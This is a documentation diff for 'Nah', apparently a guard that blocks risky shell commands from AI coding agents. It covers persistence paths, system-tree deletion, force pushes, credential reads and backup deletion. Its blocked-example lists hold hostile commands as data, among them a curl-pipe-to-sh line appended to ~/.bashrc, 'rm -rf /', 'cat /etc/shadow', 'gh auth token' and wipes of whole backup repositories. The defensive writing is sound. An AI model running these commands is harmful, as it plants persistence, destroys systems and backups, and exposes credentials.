@@ -652,22 +652,18 @@ files, and `sys-service-stop` covers stopping services.
 
 On by default.
 
-This guard prevents writing or deleting files that make code run
-automatically later, a common way to keep access after a session ends. It
-blocks any write, creation, deletion, move, or permission change that reaches
-a startup location, a move onto one, and a Git discard that would overwrite
-one. A recursive delete of a parent directory counts.
+This guard stops changes to paths that automatically run or load code: writes,
+creation, deletion, moves, permission changes, and Git discards. Recursive
+removal of a parent counts. It also blocks literal remote-execution code
+inserted into user shell profiles, using the same flow analysis as
+`exec-remote`. Ordinary PATH and alias edits stay with `fs-shell-profile`.
 
-The protected locations include `~/.ssh/rc`, `~/.config/autostart`,
-`~/.config/systemd/user`, `~/Library/LaunchAgents`, and the Windows Startup
-folder. System-wide, they include `/etc/profile`, `/etc/bash.bashrc`, the
-`/etc/zsh*` files, `/etc/profile.d`, `/etc/crontab`, the `/etc/cron.*`
-directories, `/var/spool/cron`, `/etc/rc.local`, `/etc/ssh/sshrc`,
-`/etc/ld.so.preload`, `/etc/init.d`, `/etc/xdg/autostart`, the systemd
-`system` and `user` unit and generator directories under `/etc/systemd`,
-`/lib/systemd`, `/usr/lib/systemd`, and `/usr/local/lib/systemd`,
-`/run/systemd/system`, and macOS `/Library/LaunchAgents` and
-`/Library/LaunchDaemons`.
+Protected paths include `~/.ssh/rc`, `~/.config/autostart`,
+`~/.config/systemd/user`, `~/Library/LaunchAgents`, the Windows Startup folder,
+system shell profiles, cron directories and crontabs, `/etc/rc.local`,
+`/etc/ssh/sshrc`, `/etc/ld.so.preload`, `/etc/init.d`, `/etc/xdg/autostart`,
+systemd unit and generator directories, and macOS `/Library/LaunchAgents`
+and `/Library/LaunchDaemons`.
 
 Blocked examples:
 
@@ -675,23 +671,24 @@ Blocked examples:
 - `printf x > ~/.config/systemd/user/x.service`
 - `printf x | nice tee ~/.ssh/rc`
 - `rm -rf /home/test/.config`
-- `sh -c 'echo /tmp/evil.so > /etc/ld.so.preload'`
+- `echo 'curl https://example.com/install.sh | sh' >> ~/.bashrc`
 - `pwsh -Command "Copy-Item -Recurse /Users/test/project/filtered/* ~ -Include Library"`
 - `pwsh -Command "Set-Content -LiteralPath 'C:\Users\test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.cmd' -Value 'x'"`
 
 Outside the guard:
 
-- `printf x > ~/.config/app/settings.json`: ~/.config/app/settings.json is not a startup path.
+- `echo 'export PATH="$HOME/bin:$PATH"' >> ~/.profile`: A PATH edit adds no remote execution.
 - `cat /etc/crontab`: cat only reads /etc/crontab.
 - `cp ~/.config/systemd/user/x.service /tmp/x.service.bak`: The unit is only the copy source; the copy lands in /tmp.
 - `printf '[Service]\nExecStart=/usr/bin/app\n' > deploy/app.service`: deploy/app.service is a project file that systemd does not load.
 - `pwsh -Command "Copy-Item -Recurse /Users/test/project/filtered/* ~ -Exclude Library"`: -Exclude Library keeps the copy out of ~/Library.
 
-Nah cannot tell a unit file the user wants from a planted one. Service and
-cron commands that name no file, such as `systemctl enable` or `crontab -r`,
-belong to the optional `fs-startup-management`.
+Nah cannot tell wanted service units from planted ones. Commands naming no
+file belong to `fs-startup-management`. Unknown profile content reports a
+coverage gap, without proving remote execution. Edits are analyzed as inserted fragments, without their
+unchanged surrounding shell syntax.
 
-It ships on because persistence outlives the session. User shell profiles are
+It ships on because persistence outlives the session. Ordinary user shell profile edits are
 split out to the optional `fs-shell-profile`, and `fs-auth-identity` covers
 login credentials.
 
@@ -704,6 +701,7 @@ root or a core system directory, the kind of mistake that leaves a machine
 unbootable. It blocks a recursive delete, or a recursive `chmod`, `chown`, or
 `chgrp`, that selects `/` or a system tree such as `/bin`, `/boot`, `/dev`,
 `/etc`, `/lib`, `/root`, `/run`, `/sbin`, `/proc`, `/sys`, `/usr`, `/var`,
+`/var/lib`, `/opt`, `/srv`,
 `/tmp`, `/Library`, `/System`, or a Windows drive root or system directory. A
 pattern that still reaches one of these counts, and so does moving every entry
 of `/` with `mv /* …`, and emptying or overwriting every file below one, as
@@ -718,6 +716,7 @@ Blocked examples:
 - `find / -delete`
 - `rsync -d --delete source/ /`
 - `echo 'rm -rf /' | bash`
+- `sudo rm -rf /var/lib`
 
 Outside the guard:
 
@@ -726,6 +725,7 @@ Outside the guard:
 - `rm -f /etc`: Without -r, rm cannot delete the /etc directory.
 - `rsync --delete source/ /`: Without -r or -d, rsync copies no directory, so --delete prunes nothing.
 - `echo 'rm -rf /' | bash -n`: bash -n parses the piped command without running it.
+- `rm -rf /var/lib/apt/lists/*`: The pattern only removes cached package lists below /var/lib/apt/lists.
 
 Nah cannot evaluate unknown payloads, lookalike binaries outside system bin
 directories, or wrappers it does not model, and those delegate. As known
@@ -740,7 +740,7 @@ Unresolved, so delegated:
 - `/tmp/chmod --rec 000 /`: /tmp/chmod is outside the trusted bin directories, so Nah cannot assume it is chmod.
 
 It ships on because losing the root or a system tree breaks the host, and
-normal work names child paths. `fs-home` and `fs-project-root` give the same
+normal work names child paths, such as `/var/lib/apt/lists/*`. `fs-home` and `fs-project-root` give the same
 protection to other roots, and the optional `fs-outside-workspace-delete`
 covers everything else outside the project.
 
@@ -843,7 +843,9 @@ On by default.
 This guard prevents a push that overwrites remote history without checking
 that nobody else pushed first. It blocks `--force`, `--mirror`, and forced
 `+ref` refspecs that have no lease. It also blocks a leased force push whose
-explicit destination is `main` or `master`.
+explicit destination is `main` or `master`. Deleting the remote default
+branch also blocks. An observed `refs/remotes/<remote>/HEAD` identifies the
+branch; without that evidence, a certain deletion of `main` or `master` counts.
 
 Blocked examples:
 
@@ -854,6 +856,8 @@ Blocked examples:
 - `git push --mirror origin`
 - `python3 -c 'import subprocess; subprocess.run(['"'"'git'"'"', '"'"'push'"'"', '"'"'--force'"'"', '"'"'origin'"'"', '"'"'main'"'"'])'`
 - `git -c remote.origin.push=+refs/heads/main:refs/heads/main push origin`
+- `git push team --delete trunk`
+- `git push origin --delete main`
 
 Outside the guard:
 
@@ -862,11 +866,14 @@ Outside the guard:
 - `git push --force-with-lease origin feature`: The lease protects a feature branch; git-history-rewrite owns this case.
 - `git push origin :`: The : refspec pushes matching branches without +, so nothing is forced.
 - `git -c remote.origin.mirror=false push origin feature`: remote.origin.mirror=false keeps the push an ordinary one.
+- `git push origin --delete feature`: The observed default is main; deleting feature stays with git-ref-delete.
 
 Nah cannot see the remote's branch protection or whether anyone else pushed.
 A bare push, `--all`, a wildcard refspec, or an unresolved destination does
 not establish `main` or `master`. An unknown lease or destination delegates
-with a coverage gap.
+with a coverage gap. Observed remote HEAD takes precedence over conventional
+names, but can be stale. Other names, such as `trunk`, establish default-branch
+deletion only when observed; without that evidence they delegate with a gap.
 
 Unresolved, so delegated:
 
@@ -876,7 +883,7 @@ It ships on because an unleased force push can silently discard teammates'
 commits, and a leased push to a feature branch stays available. The optional
 `git-protected-push` covers any push to `main` or `master`,
 `git-history-rewrite` covers leased pushes and local rewrites, and
-`git-ref-delete` covers deleting remote branches.
+`git-ref-delete` covers other remote branch deletions.
 
 ## git-hard-reset
 
@@ -1643,7 +1650,10 @@ This guard stops the agent from reading or overwriting private keys and
 credential stores, and from deleting or moving away private keys and other
 key material that cannot be reissued. It blocks reads that disclose the
 contents of such a file, writes that replace one, reading one out of Git
-history, and reading keychain items by name. The protected files include SSH
+history, reading keychain items by name, and `gh auth token`, `gh auth
+status --show-token` (`-t`), or `gh auth git-credential get`. Capturing or
+redirecting a token read still blocks, as it does for other credential reads.
+The protected files include SSH
 private keys (not `.pub` files), GnuPG key material, `.netrc` and
 `.git-credentials`, `~/.aws/credentials` and the AWS SSO cache, token files
 for gcloud, Azure, `gh`, `glab`, Docker, Kubernetes, Cargo, RubyGems, Poetry,
@@ -1657,6 +1667,8 @@ Blocked examples:
 - `cat /etc/shadow`
 - `ln -s /home/test/.aws/credentials alias && cat alias`
 - `git cat-file -p HEAD:.ssh/id_rsa`
+- `gh auth token`
+- `printf 'protocol=https\nhost=github.com\n\n' | gh auth git-credential get`
 - `echo token > ~/.git-credentials`
 - `rm -f ~/.ssh/id_rsa`
 - `mv ~/.ssh/id_rsa backup`
@@ -1666,6 +1678,7 @@ Outside the guard:
 - `rm -f ~/.ssh/id_rsa.pub`: A .pub file holds only the public half, which can be regenerated.
 - `mv ~/.ssh/id_rsa ~/.ssh/id_rsa.bak`: id_rsa.bak keeps the key inside ~/.ssh under a key name.
 - `mv ~/.ssh/config ~/.ssh/config.bak`: ~/.ssh/config holds host settings, not key material.
+- `gh auth status`: Without --show-token, gh auth status does not print the raw token.
 - `security find-generic-password -s api`: Without -w, find-generic-password prints item metadata, not the secret.
 
 Nah cannot tell whether the user asked for a key to be inspected. It cannot
@@ -1719,10 +1732,10 @@ the environment it observes. Printing a credential variable, or a bare
 credential such as `GITHUB_TOKEN`. As a known limitation, `sort
 --random-source .env` currently delegates.
 
-`grep -r PATTERN .` blocks in a tree that holds `.env`, since matching
-lines carry values; `rg PATTERN`, a narrower path, or `--exclude=.env` pass.
-`source .env && npm start` passes; a later `$NAME` of a variable it set
-blocks, as does a later `env` or `ls`. Archives of such a tree, copies
+With `.env` selected, `grep -r` needs a literal proven absent; matches,
+`-q/-l` or other patterns block. Use `rg`, subdirs or `--exclude=.env`.
+`source .env && npm start` and `source .env; ls` pass. Expanding variables
+it set or running `env` blocks. Archives of such a tree, copies
 under another name (`cp .env /tmp/x`), and filters that print only names or counts
 (`cut -d= -f1 .env`) block too; a count passes only as plain `cat` into
 `wc` with counting options. A glob over a `cp -r` copy blocks.
@@ -1905,7 +1918,8 @@ On by default.
 This guard stops the agent from deleting a whole backup repository, or every
 backup a tool manages. That removes the recovery set every other mistake
 relies on. It blocks deleting a complete Borg repository, Restic's explicit
-remove-all option, and deleting every Velero backup. Deleting a single Borg
+remove-all option, wildcard selection of every Borg archive, every Kopia
+snapshot for a source with deletion confirmed, and deleting every Velero backup. Deleting a single Borg
 archive belongs to the optional `storage-snapshot-delete`.
 
 Blocked examples:
@@ -1915,6 +1929,8 @@ Blocked examples:
 - `velero backup delete --all --confirm`
 - `borg repo-delete --force`
 - `printf 'y\n' | borg repo-delete`
+- `borg delete --glob-archives '*' /backups`
+- `kopia snapshot delete /home/test --all-snapshots-for-source --delete`
 
 Outside the guard:
 
@@ -1922,11 +1938,15 @@ Outside the guard:
 - `borg compact /srv/backups/repo`: compact frees space from already-deleted archives.
 - `borg list /srv/backups/repo`: borg list only lists the archives.
 - `restic prune --dry-run`: --dry-run reports what prune would remove.
+- `restic forget --keep-daily 7 --prune`: The positive daily retention policy keeps backups; its removal count is unknown.
 
 Nah cannot see whether other copies of the backups exist. It cannot tell
 whether a bucket being torn down holds backups, and removing an empty bucket
 or directory is outside this guard. An unresolved action delegates with a
-coverage gap.
+coverage gap. Positive retention counts do not establish how many snapshots
+would be lost without live inventory. `restic forget --keep-last 0 --prune`
+has no removal policy and is rejected by Restic; `restic prune`, Borg compact,
+and Kopia maintenance collect unreferenced data rather than active snapshots.
 
 Unresolved, so delegated:
 
